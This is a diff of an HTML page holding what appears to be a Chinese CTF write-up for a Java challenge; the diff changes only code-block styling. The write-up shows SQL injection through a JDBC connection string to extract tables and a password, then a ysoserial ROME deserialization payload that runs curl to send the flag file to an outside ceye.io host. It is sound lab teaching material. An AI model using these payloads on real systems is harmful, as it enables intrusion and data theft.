@@ -331,37 +331,37 @@
 <p>再看其调用的<code>getConnection</code>函数，使用<code>jdbc</code>链接数据库</p>
 <blockquote>
 <p>jdbc连接数据库语句后面可以跟参数，所以</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">jdbc:mysql://localhost:3306/myapp<span class="token comment">#' union select 1#</span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">jdbc:mysql://localhost:3306/myapp<span class="token comment">#' union select 1#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 </blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f3.png" alt=""></p>
-<h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 得到表名</span>
+<h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 得到表名</span>
 jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(table_name) from information_schema.tables where table_schema=database()#</span>
 <span class="token comment"># 得到列名</span>
 jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT group_concat(column_name) from information_schema.columns where table_name='user'#</span>
 <span class="token comment"># 得到数据</span>
-jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT pwd from user#</span></code></pre>
+jdbc:mysql://localhost:3306/myapp<span class="token comment">#' UNION SELECT pwd from user#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>此时得到密码 <code>admin@Rrrr_ctf_asde</code></p>
 <h2 id="4-反序列化"><a href="#4-反序列化" class="headerlink" title="4. 反序列化"></a>4. 反序列化</h2><p>登陆请求包发送之后，得到的响应体如下</p>
-<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
   <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu"</span><span class="token punctuation">,</span>
   <span class="token property">"msg"</span><span class="token operator">:</span> <span class="token string">"登录成功"</span><span class="token punctuation">,</span>
   <span class="token property">"status"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
   <span class="token property">"timestamps"</span><span class="token operator">:</span> <span class="token number">1629722881931</span>
-<span class="token punctuation">&#125;</span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。<br>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</p>
 </blockquote>
 <p>于是思路为在路由地址<code>/common/user/current</code> 发送base64加密后的序列化的payload</p>
-<h5 id="利用ysoserial生成序列化的payload"><a href="#利用ysoserial生成序列化的payload" class="headerlink" title="利用ysoserial生成序列化的payload"></a>利用<code>ysoserial</code>生成序列化的payload</h5><pre class="language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token operator">></span>F:<span class="token punctuation">\</span>Java<span class="token punctuation">\</span>jre1.8<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>java.exe -jar ysoserial-master-8eb5cbfbf6-1.jar ROME <span class="token string">"curl -d @/flag http://x.ceye.io/"</span> <span class="token operator">></span> a.txt</code></pre>
+<h5 id="利用ysoserial生成序列化的payload"><a href="#利用ysoserial生成序列化的payload" class="headerlink" title="利用ysoserial生成序列化的payload"></a>利用<code>ysoserial</code>生成序列化的payload</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>Desktop<span class="token operator">></span>F:<span class="token punctuation">\</span>Java<span class="token punctuation">\</span>jre1.8<span class="token punctuation">\</span>bin<span class="token punctuation">\</span>java.exe -jar ysoserial-master-8eb5cbfbf6-1.jar ROME <span class="token string">"curl -d @/flag http://x.ceye.io/"</span> <span class="token operator">></span> a.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>payload为使用curl命令将flag文件内容发送至ceye平台</p>
 </blockquote>
-<h5 id="将其base64加密"><a href="#将其base64加密" class="headerlink" title="将其base64加密"></a>将其base64加密</h5><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
+<h5 id="将其base64加密"><a href="#将其base64加密" class="headerlink" title="将其base64加密"></a>将其base64加密</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
 s <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"a.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
     s <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>将数据在<code>/common/user/current</code>发送即可得到flag</p>
 <p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN@master/CTF-files/think_java_f4.png" alt=""></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
